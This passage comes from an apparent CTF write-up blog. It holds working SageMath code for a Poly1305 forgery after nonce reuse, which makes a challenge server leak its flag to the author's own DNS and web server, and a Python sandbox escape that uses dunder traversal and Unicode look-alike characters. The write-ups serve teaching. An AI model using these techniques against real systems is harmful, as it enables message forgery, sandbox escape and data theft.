stretchy="false">)</mo>  <mo>&#x2212;</mo>  <mn>5</mn>  <mo stretchy="false">)</mo></math><hr><p>for <strong>k</strong> ∈−4,…,4. This gives us 9 polynomials (for the 9 possible <code>k</code> values) whose coefficients are known, and we know that the correct value of <code>r</code> is a zero for one of them. For any candidate <code>r</code> value we can directly compute the associated <code>s</code> value using equation (1) above. Thus, we will have a small list of possible <code>(r,s)</code> keys to forge a new message with; experimentally, for our case the number of pairs was only ever between 1-3. Therefore, with high probability the forgery will succeed if we take a random <code>(r,s)</code> from the candidate list. With any <code>(r,s)</code> pair, we can directly compute the Poly1305 authentication tag <code>tag3</code> for an arbitrary message of our choosing <code>msg3</code> by manually evaluating the Poly1305 polynomial as described <a href="https://en.wikipedia.org/wiki/Poly1305#Definition_of_Poly1305">here</a> (Ref. 1).</p><p>These steps are shown in the following sagemath code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#############################################################</span><br><span class="hljs-comment">###  Poly1305 Message Forgery Attack - Key &amp; Nonce Reuse  ###</span><br><span class="hljs-comment">#############################################################</span><br><br><span class="hljs-comment"># The output from ChaCha20-Poly1305 is the ciphertext (ChaCha20) and the tag (Poly1305)</span><br><span class="hljs-comment"># To execute the Poly1305 forgery attack, we need the input messages fed into the Poly1305 hash function.</span><br><span class="hljs-comment"># These messages are a concatenation of the authenticated data (none in our case), padding, the ciphertext,</span><br><span class="hljs-comment"># ciphertext padding, and some length fields.</span><br><span class="hljs-comment"># https://datatracker.ietf.org/doc/html/rfc7539#section-2.8 </span><br>msg1 = ct1 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct1)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br>msg2 = ct2 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct2)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg2) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-built_in">len</span>(msg2))<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># Define the Poly1305 parameters for our problem</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305</span><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">130</span> - <span class="hljs-number">5</span><br>L = <span class="hljs-built_in">len</span>(msg1)<br>q = L // <span class="hljs-number">16</span><br><span class="hljs-keyword">assert</span>(q == <span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Break the messages into consecutive 16-byte chunks</span><br><span class="hljs-comment"># (Step 2 of Wikipedia page)</span><br>m1_chunks = [msg1[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br>m2_chunks = [msg2[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br><br><span class="hljs-comment"># Interpret the 16-byte chunks as 17-byte little-endian integers by appending a 1 byte to every 16-byte chunk, to be used as coefficients of a polynomial.</span><br><span class="hljs-comment"># (Step 3 of Wikipedia page)</span><br>coeffs_1 = []<br>coeffs_2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q):<br>k = <span class="hljs-number">0</span><br>c_i_1 = <span class="hljs-number">0</span><br>c_i_2 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>c_i_1 += m1_chunks[i][k] * <span class="hljs-number">2</span>**j<br>c_i_2 += m2_chunks[i][k] * <span class="hljs-number">2</span>**j<br>k += <span class="hljs-number">1</span><br>coeffs_1.append(c_i_1)<br>coeffs_2.append(c_i_2)<br><br><span class="hljs-comment"># Interpret the tags (bytes) as little-endian integers</span><br>a1 = <span class="hljs-built_in">int</span>.from_bytes(tag1, <span class="hljs-string">&#x27;little&#x27;</span>)<br>a2 = <span class="hljs-built_in">int</span>.from_bytes(tag2, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Define the Finite Field over p = 2^130 - 5 and create the 2 polynomials for the chosen pair messages encrypted/authenticated with the same key (r,s)</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305#Security</span><br><span class="hljs-comment"># https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused</span><br>R.&lt;r&gt; = GF(p)[]<br>poly1305_1 = <span class="hljs-built_in">sum</span>([coeffs_1[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) <br>poly1305_2 = <span class="hljs-built_in">sum</span>([coeffs_2[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)])<br><br><span class="hljs-comment"># Find the roots of all 9 possible polynomials and gather the list of potential r values</span><br>valid_roots = []<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (-<span class="hljs-number">4</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>):<br>f = poly1305_1 - poly1305_2 - (a1 - a2 + k*<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br>roots = f.roots()<br><span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> roots:<br><span class="hljs-keyword">if</span> root[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">2</span>**<span class="hljs-number">128</span>:<br>valid_roots.append(root[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;valid_roots&#x27;</span>, valid_roots)<br><br><span class="hljs-comment"># Find the associated s values for the candidate r values</span><br>r_values = []<br>s_values = []<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> valid_roots:<br>r = Integer(r)<br>poly1305_1 = <span class="hljs-built_in">sum</span>([coeffs_1[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>poly1305_2 = <span class="hljs-built_in">sum</span>([coeffs_2[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>s1 = (a1 - poly1305_1) % <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br>s2 = (a2 - poly1305_2) % <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br><span class="hljs-keyword">if</span> s1 == s2:<br>r_values.append(r)<br>s_values.append(s1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r_values&#x27;</span>, r_values)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s_values&#x27;</span>, s_values)<br><br><br><span class="hljs-comment">#######################</span><br><span class="hljs-comment">### Message Forgery ###</span><br><span class="hljs-comment">#######################</span><br><br><span class="hljs-comment"># Now attempt to forge a new message using candidate (r,s) pairs</span><br><br><span class="hljs-comment"># Since both the nonce and key are reused, and we know both the plaintext</span><br><span class="hljs-comment"># and ciphertext, we can directly recover the keystream via XOR and use this</span><br><span class="hljs-comment"># to encrypt arbitrary messages</span><br>key1 = byte_xor(pkt1, ct1)<br>key2 = byte_xor(pkt2, ct2)<br><span class="hljs-keyword">assert</span>(key1 == key2)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(key1) == <span class="hljs-number">48</span>)<br>key = key1<br><br><span class="hljs-comment"># Encrypt a 3rd adversarial message packet</span><br>pkt3 = <span class="hljs-built_in">bytearray</span>(<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip_dot_3.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br><span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span> +<br><span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">15</span> +<br><span class="hljs-string">b&quot;\x00&quot;</span><br>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(pkt3) == <span class="hljs-number">48</span>)<br>ct3 = byte_xor(pkt3, key)<br>nonce3 = nonce2<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct3 = <span class="hljs-subst">&#123;ct3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;nonce3 = <span class="hljs-subst">&#123;nonce3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># https://datatracker.ietf.org/doc/html/rfc7539#section-2.8 </span><br>msg3 = ct3 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct3)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg3) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg3) == <span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># Define the Poly1305 parameters for our problem</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305</span><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">130</span> - <span class="hljs-number">5</span><br>L = <span class="hljs-built_in">len</span>(msg3)<br>q = L // <span class="hljs-number">16</span><br><span class="hljs-keyword">assert</span>(q == <span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Break the message into consecutive 16-byte chunks</span><br><span class="hljs-comment"># (Step 2 of Wikipedia page)</span><br>m3_chunks = [msg3[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br><br><span class="hljs-comment"># Interpret the 16-byte chunks as 17-byte little-endian integers by appending a 1 byte to every 16-byte chunk, to be used as coefficients of a polynomial.</span><br><span class="hljs-comment"># (Step 3 of Wikipedia page)</span><br>coeffs_3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q):<br>k = <span class="hljs-number">0</span><br>c_i_3 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>c_i_3 += m3_chunks[i][k] * <span class="hljs-number">2</span>**j<br>k += <span class="hljs-number">1</span><br>coeffs_3.append(c_i_3)<br><br><span class="hljs-comment"># Try all candidate (r,s) pairs</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r_values)):<br><br>r = r_values[i]<br>s = s_values[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;i = <span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;--&gt; r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;--&gt; s = <span class="hljs-subst">&#123;s&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># Create forged authentication tag by directly evaluating the Poly1305 polynomial on msg3 using (r,s)</span><br><span class="hljs-comment"># by following the steps described here: https://en.wikipedia.org/wiki/Poly1305#Definition_of_Poly1305</span><br>poly1305_3 = <span class="hljs-built_in">sum</span>([coeffs_3[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>a3 = (poly1305_3 + s) % <span class="hljs-number">2</span>**<span class="hljs-number">128</span><br>tag3 = <span class="hljs-built_in">int</span>(a3).to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>crc3 = calc_crc(pkt3)<br>pkt3 = ct3 + tag3 + nonce3 <br><span class="hljs-comment"># Attempt to send this packet to the FlagServer for decryption:</span><br>message_to_flag_server = <span class="hljs-built_in">bytearray</span>(<br>dhcp_server_mac + <span class="hljs-comment"># src mac</span><br>flag_server_mac + <span class="hljs-comment"># dst mac</span><br><span class="hljs-string">b&#x27;\x02&#x27;</span> +<br>pkt3 +<br>crc3<br>)<br>send_message_to_flag_server(message_to_flag_server)<br></code></pre></td></tr></table></figure><h4 id="5-Send-an-other-request-to-the-FlagServer-this-time-using-the-0x03-byte-message-type-to-make-the-FlagServer-send-the-flag-to-what-they-think-is-example-com-i-e-us"><a href="#5-Send-an-other-request-to-the-FlagServer-this-time-using-the-0x03-byte-message-type-to-make-the-FlagServer-send-the-flag-to-what-they-think-is-example-com-i-e-us" class="headerlink" title="5. Send an other request to the FlagServer - this time using the 0x03-byte message type - to make the FlagServer send the flag to, what they think is, example.com, i.e. us."></a>5. Send an other request to the <strong>FlagServer</strong> - this time using the <code>0x03</code>-byte message type - to make the <strong>FlagServer</strong> send the flag to, what they think is, <code>example.com</code>, i.e. us.</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Tell the FlagServer to send the flag:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Make FlagServer transmit the flag to (- what they think is -) http://example.com/&#123;flag&#125;&#x27;</span>)<br>message_to_flag_server = <span class="hljs-built_in">bytearray</span>(<br>dhcp_server_mac + <span class="hljs-comment"># src mac</span><br>flag_server_mac + <span class="hljs-comment"># dst mac</span><br><span class="hljs-string">b&#x27;\x03&#x27;</span><br>)<br>send_message_to_flag_server(message_to_flag_server)<br><br>conn.close()<br></code></pre></td></tr></table></figure><h4 id="6-Receive-the-flag"><a href="#6-Receive-the-flag" class="headerlink" title="6. Receive the flag."></a>6. Receive the flag.</h4><p>After sending the previous request to the <strong>FlagServer</strong>, we’ll receive an incoming request to our <strong>DNS server</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python Server.py        <br>DNS Listening on 192.168.178.79:53 ...<br>Request from (<span class="hljs-string">&#x27;44.203.85.176&#x27;</span>, 57501) <span class="hljs-keyword">for</span> example.com<br></code></pre></td></tr></table></figure><p>Right after that, we’ll notice an incoming request to our <strong>web server</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>44.203.85.176 - - [15/Apr/2024 01:15:58] code 404, message File not found<br>44.203.85.176 - - [15/Apr/2024 01:15:58] <span class="hljs-string">&quot;GET /PCTF%7Bd0nt_r3u5e_th3_n0nc3_d4839ed727736624%7D HTTP/1.1&quot;</span> 404 -<br></code></pre></td></tr></table></figure><p>Of course, we won’t know the flag in advance, so we couldn’t setup a file named like the flag; thus the <strong>web server</strong> will clearly respond with a <strong>404</strong> when being asked for the specified ressource, but we can still extract the name of the requested ressource and url-decode it to receive the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><span class="hljs-built_in">print</span>(unquote(<span class="hljs-string">&#x27;PCTF%7Bd0nt_r3u5e_th3_n0nc3_d4839ed727736624%7D&#x27;</span>))<br></code></pre></td></tr></table></figure><p>And finally, there we go: <code>PCTF&#123;d0nt_r3u5e_th3_n0nc3_d4839ed727736624&#125;</code></p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><h3 id="Networking-related"><a href="#Networking-related" class="headerlink" title="Networking related"></a>Networking related</h3><ul><li><a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">Wikipedia: DHCP - Dynamic Host Configuration Protocol</a></li><li><a href="https://en.wikipedia.org/wiki/Domain_Name_System">Wikipedia: DNS - Domain Name System</a></li><li><a href="https://en.wikipedia.org/wiki/IP_address">Wikipedia: IP address</a></li><li><a href="https://en.wikipedia.org/wiki/MAC_address">Wikipedia: MAC address</a></li></ul><h3 id="Crypto-related"><a href="#Crypto-related" class="headerlink" title="Crypto related"></a>Crypto related</h3><ul><li><a href="https://en.wikipedia.org/wiki/SHA-2">Wikipedia: SHA256</a></li><li><a href="https://en.wikipedia.org/wiki/ChaCha20-Poly1305">Wikipedia: ChaCha20-Poly1305</a></li><li><a href="https://en.wikipedia.org/wiki/Poly1305">Wikipedia: Poly1305</a></li><li><a href="https://en.wikipedia.org/wiki/Message_authentication_code">Wikipedia: MAC - Message authentication code</a></li><li><a href="https://datatracker.ietf.org/doc/html/rfc7539#section-2.8">RFC 7539: ChaCha20 and Poly1305 for IETF Protocols</a></li><li><a href="https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused">Forgery attack on Poly1305 when the key and nonce reused</a></li><li><a href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Cipher/ChaCha20_Poly1305.py">PyCryptodome ChaCha20_Poly1305.py</a></li><li><a href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Hash/Poly1305.py">PyCryptodome Poly1305.py</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>UofT CTF 2024 - [Zero] - Jail</title>
    <link href="/2024/01/14/uoftctf24/"/>
    <url>/2024/01/14/uoftctf24/</url>
    
    <content type="html"><![CDATA[<h1 id="Zero"><a href="#Zero" class="headerlink" title="Zero"></a>Zero</h1><div class="note note-warning">            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Jail</strong><br><strong>Flag:</strong> <strong><code>uoftctf{zero_security_too_apparently_lmao}</code></strong></p>          </div><p>In this challenge, we are given the following PyJail:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-comment"># no letters</span><br>    alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>    <span class="hljs-comment"># no numbers</span><br>    numbers = <span class="hljs-string">&quot;0123456789&quot;</span><br>    <span class="hljs-comment"># no underscores</span><br>    underscore = <span class="hljs-string">&quot;__&quot;</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>((c <span class="hljs-keyword">in</span> alphabet) <span class="hljs-keyword">or</span> (c <span class="hljs-keyword">in</span> numbers) <span class="hljs-keyword">or</span> (underscore <span class="hljs-keyword">in</span> code) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> code)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_eval</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">if</span> (check(code)):<br>        g = &#123;<span class="hljs-string">&#x27;__builtins__&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br>        l = &#123;<span class="hljs-string">&#x27;__builtins__&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code, g, l )) <span class="hljs-comment"># good luck!</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lol no&quot;</span>)<br>        <br>code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>safe_eval(code)<br></code></pre></td></tr></table></figure><p>This code sanitizes our input by removing all builtins and enforcing a blacklist on alphanumeric characters and double underscores “__”. This severely limits our ability to execute code, but as a wise man once said…</p><p><img src="/../images/uoftctf24/nothing-is-impossible-shia-labeouf.gif" alt="gif"></p><p>As soon as I saw this challenge, I immediately remembered two very similar challenges I solved from BYUCTF 2023: <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/builtins-2">one which removed builtins</a> and <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/a-z0-9">another which blacklisted alphanumeric characters</a>. As this challenge is essentially a combination of the two, my solution incorporates similar techniques.</p><p>Our ultimate goal is to read the <code>flag</code> file whose name&#x2F;path is visible in the Dockerfile. In the absence of any restrictions, we could do this with something like </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()) <span class="hljs-comment"># (1)</span><br></code></pre></td></tr></table></figure><p>However, here we have several restrictions which prevent this simple code injection. The first one we need to bypass is the removal of builtins, which are native Python functions (such as <code>print()</code>) that are typically available by default. To recover these, we can exploit <a href="https://www.tutorialsteacher.com/python/magic-methods-in-python">the dunder method hierarchy</a> on Python objects like lists <code>[]</code>, tuples <code>()</code>, etc. In essence, we can traverse “up” and “down” the dunder method hierarchy to access all builtin methods which were removed in the sanitization. The following will do the same as (1) above, bypassing the builtins removal:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">121</span>].get_data(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (2)</span><br></code></pre></td></tr></table></figure><p>(For more information on how this works, see <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins">here</a>. Note that the index <code>121</code> may vary by machine, so some tweaking&#x2F;bruting may be required.)</p><p>We can improve on (2) above to bypass the <strong>__</strong> blacklist by using Unicode character U+FF3F (<code>＿</code>) (<a href="https://www.compart.com/en/unicode/U+FF3F">found here</a>). Amazingly, Python interprets this character as an underscore in code execution, yet it passes the blacklist check!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿class_＿._＿bases_＿[<span class="hljs-number">0</span>]._＿subclasses_＿()[<span class="hljs-number">121</span>].get_data(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (3)</span><br></code></pre></td></tr></table></figure><p>Now we need to bypass the alphanumeric character restriction, and this is where the challenge <em>really</em> begins. Buckle up, it’s about to get messy…</p><p><img src="/../images/uoftctf24/the_office.gif" alt="gif"></p><p>First let us start with replacing all alphabet characters <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</code>. Just like with the underscores, we can utilize Unicode alphabet characters for parts of our exploit. The Python interpreter will perceive these as normal alphabet chars, but since they are not standard ASCII, they will bypass the blacklist check. I used some Unicode gothic alphabet characters (found <a href="https://en.wikipedia.org/wiki/Mathematical_Alphanumeric_Symbols">here</a>) 